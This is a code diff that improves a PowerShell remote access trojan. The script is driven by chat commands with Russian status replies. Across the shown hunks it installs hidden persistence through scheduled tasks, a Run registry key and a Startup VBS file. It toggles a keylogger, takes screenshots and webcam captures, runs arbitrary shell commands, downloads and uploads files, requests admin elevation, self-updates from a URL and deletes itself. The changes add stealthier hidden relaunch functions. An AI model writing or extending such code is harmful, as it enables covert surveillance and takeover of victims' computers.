@@ -47,13 +47,13 @@ function Shot($c){
 function IsAdmin{ ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }
 function Persist($on){
   $ps=(Get-Command powershell).Source
-  $a="-w h -ep bypass -f `"$p`""
+  $a="-nop -w h -ep bypass -f `"$p`""
   if($on){
     schtasks /create /tn WinSvc /tr "`"$ps`" $a" /sc onlogon /f | Out-Null
     schtasks /create /tn WinSvcK /tr "`"$ps`" $a" /sc minute /mo 10 /f | Out-Null
     New-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name WinSvc -Value "powershell $a" -PropertyType String -Force | Out-Null
     $st=[Environment]::GetFolderPath('Startup')
-    ('CreateObject("WScript.Shell").Run "powershell -w h -ep bypass -f ""' + $p + '""",0,False') | Set-Content "$st\WinSvc.vbs" -Encoding ASCII
+    ('CreateObject("WScript.Shell").Run "powershell -nop -w h -ep bypass -f ""' + $p + '""",0,False') | Set-Content "$st\WinSvc.vbs" -Encoding ASCII
   } else {
     schtasks /delete /tn WinSvc /f | Out-Null; schtasks /delete /tn WinSvcK /f | Out-Null
     Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name WinSvc
@@ -76,10 +76,18 @@ function Eval($code,$to=25){
 function Click($x,$y,$btn){
   $s='[DllImport("user32.dll")]public static extern bool SetCursorPos(int x,int y);[DllImport("user32.dll")]public static extern void mouse_event(uint f,uint dx,uint dy,uint d,IntPtr e);'
   $n=Add-Type -MemberDefinition $s -Name C -Namespace CC -PassThru
-  if($btn -ne 'none'){ $n::SetCursorPos([int]$x,[int]$y) | Out-Null }
+  $n::SetCursorPos([int]$x,[int]$y) | Out-Null
   if($btn -eq 'right'){ $n::mouse_event(8,0,0,0,[IntPtr]0); $n::mouse_event(16,0,0,0,[IntPtr]0) }
   elseif($btn -eq 'double'){ $n::mouse_event(2,0,0,0,[IntPtr]0); $n::mouse_event(4,0,0,0,[IntPtr]0); $n::mouse_event(2,0,0,0,[IntPtr]0); $n::mouse_event(4,0,0,0,[IntPtr]0) }
   elseif($btn -ne 'none'){ $n::mouse_event(2,0,0,0,[IntPtr]0); $n::mouse_event(4,0,0,0,[IntPtr]0) }
+}
+function Relaunch{
+  Start-Process cmd -WindowStyle Hidden -ArgumentList '/c',"ping -n 3 127.0.0.1 >nul & powershell -nop -w h -ep bypass -f `"$p`""
+  exit
+}
+function RelaunchAdmin{
+  Start-Process cmd -WindowStyle Hidden -Verb RunAs -ArgumentList '/c',"ping -n 3 127.0.0.1 >nul & powershell -nop -w h -ep bypass -f `"$p`""
+  exit
 }
 
 $HELP=@'
@@ -87,7 +95,7 @@ $HELP=@'
 /shot /shots N /cam /rec N /monoff /monon /bright N
 /ls /tree /cat /write /del /cp /mv /mkdir /rename /size /hidden /fileinfo /hash
 /search NAME|PATH /findtext TEXT|PATH /zip SRC|OUT /unzip /dl URL|PATH /dlurl URL|DIR /up PATH /updir PATH
-/ps /killp NAME /start PATH /sh CMD /ps1 CODE /base64 TEXT
+/ps /killp NAME /startp PATH /sh CMD /ps1 CODE /base64 TEXT
 /keys on|off|dump|clear
 /clip /clipset /input TEXT /key KEY /click X|Y|btn /move X|Y
 /msg TEXT /tts TEXT /beep /openurl URL /play PATH /titles /wall PATH|URL /loc
@@ -97,7 +105,7 @@ $HELP=@'
 /persist on|off /install /selfupdate URL /restart /hide /uninstall /kill
 '@
 
-if($first){ Persist $true; New-Item -ItemType File -Force -Path "$dir\.i" | Out-Null }
+if($first -and (Test-Path $p)){ Persist $true; New-Item -ItemType File -Force -Path "$dir\.i" | Out-Null }
 if(Test-Path $idf){ Send (Get-Content $idf -Raw).Trim() "на связи: $env:COMPUTERNAME / $env:USERNAME" }
 
 while($true){
@@ -120,7 +128,7 @@ while($true){
         '/start'{ Send $c "на связи: $env:COMPUTERNAME"; break }
         '/info'{ $ip=(ipconfig | Select-String 'IPv4'); Send $c "host: $env:COMPUTERNAME`nuser: $env:USERNAME\$env:USERDOMAIN`nadmin: $(IsAdmin)`nos: $([Environment]::OSVersion.VersionString)`nuptime: $((Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime)`n$ip`nkeys: $(KlState)"; break }
         '/admin'{ Send $c "admin: $(IsAdmin)"; break }
-        '/su'{ Start-Process (Get-Command powershell).Source -Verb RunAs -ArgumentList "-w h -ep bypass -f `"$p`""; Send $c 'запросил UAC'; break }
+        '/su'{ Send $c 'запросил UAC'; RelaunchAdmin; break }
         '/ip'{ Send $c (ipconfig /all | Out-String); break }
         '/env'{ Send $c (Get-ChildItem env: | Format-Table Name,Value -Auto | Out-String); break }
         '/whoami'{ Send $c (whoami /all | Out-String); break }
@@ -174,7 +182,7 @@ while($true){
         '/ps1'{ Send $c (Eval $a); break }
         '/base64'{ Send $c ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a))); break }
         '/keys'{ switch($a){
-            'on'{ if((KlState) -eq 'off'){ Start-Process (Get-Command powershell).Source -WindowStyle Hidden -ArgumentList "-w h -ep bypass -f `"$k`"" }; Send $c 'кейлоггер вкл' }
+            'on'{ if((KlState) -eq 'off'){ Start-Process (Get-Command powershell).Source -WindowStyle Hidden -ArgumentList "-nop -w h -ep bypass -f `"$k`"" }; Send $c 'кейлоггер вкл' }
             'off'{ Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object {$_.CommandLine -like '*kl.ps1*'} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force}; Send $c 'кейлоггер выкл' }
             'dump'{ F $c $log 'document' }
             'clear'{ Remove-Item $log -Force; Send $c 'лог очищен' }
@@ -185,7 +193,7 @@ while($true){
         '/key'{ Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait($a); break }
         '/click'{ $x=$a -split '\s+'; Click $x[0] $x[1] $x[2]; Send $c 'клик'; break }
         '/move'{ $x=$a -split '\s+'; Click $x[0] $x[1] 'none'; Send $c 'курсор'; break }
-        '/msg'{ Start-Process powershell -WindowStyle Hidden -ArgumentList '-c',"Add-Type -AssemblyName System.Windows.Forms;[Windows.Forms.MessageBox]::Show(`"$a`")"; Send $c 'показал'; break }
+        '/msg'{ Start-Process powershell -WindowStyle Hidden -ArgumentList '-nop','-c',"Add-Type -AssemblyName System.Windows.Forms;[Windows.Forms.MessageBox]::Show(`"$a`")"; Send $c 'показал'; break }
         '/tts'{ (New-Object -ComObject SAPI.SpVoice).Speak($a); Send $c 'сказал'; break }
         '/beep'{ [Console]::Beep(1000,600); break }
         '/openurl'{ Start-Process $a; Send $c 'открыл'; break }
@@ -233,10 +241,10 @@ while($true){
         '/shutdown'{ Send $c 'выключение'; shutdown /s /t 3; break }
         '/persist'{ if($a -eq 'off'){Persist $false; Send $c 'автозапуск снят'}else{Persist $true; Send $c 'автозапуск стоит'}; break }
         '/install'{ Persist $true; Send $c 'переустановил'; break }
-        '/selfupdate'{ curl.exe -sL -o "$p.new" $a; Move-Item "$p.new" $p -Force; Start-Process (Get-Command powershell).Source -WindowStyle Hidden -ArgumentList "-w h -ep bypass -f `"$p`""; Send $c 'обновился'; exit }
-        '/restart'{ Start-Process (Get-Command powershell).Source -WindowStyle Hidden -ArgumentList "-w h -ep bypass -f `"$p`""; exit }
-        '/hide'{ Start-Process (Get-Command powershell).Source -WindowStyle Hidden -ArgumentList "-w h -ep bypass -f `"$p`""; exit }
-        '/uninstall'{ Persist $false; Send $c 'удаляюсь'; Start-Process cmd -WindowStyle Hidden -ArgumentList '/c',"timeout 3 & rmdir /s /q `"$dir`""; exit }
+        '/selfupdate'{ curl.exe -sL -o "$p.new" $a; Move-Item "$p.new" $p -Force; Send $c 'обновился'; Relaunch }
+        '/restart'{ Send $c 'перезапуск'; Relaunch }
+        '/hide'{ Relaunch }
+        '/uninstall'{ Persist $false; Send $c 'удаляюсь'; Start-Process cmd -WindowStyle Hidden -ArgumentList '/c',"ping -n 4 127.0.0.1 >nul & rmdir /s /q `"$dir`""; exit }
         '/kill'{ Send $c 'отключаюсь'; exit }
         default{ if($cmd.StartsWith('/')){ Send $c 'нет такой команды' } else { Send $c (RunCmd $q) } }
       }
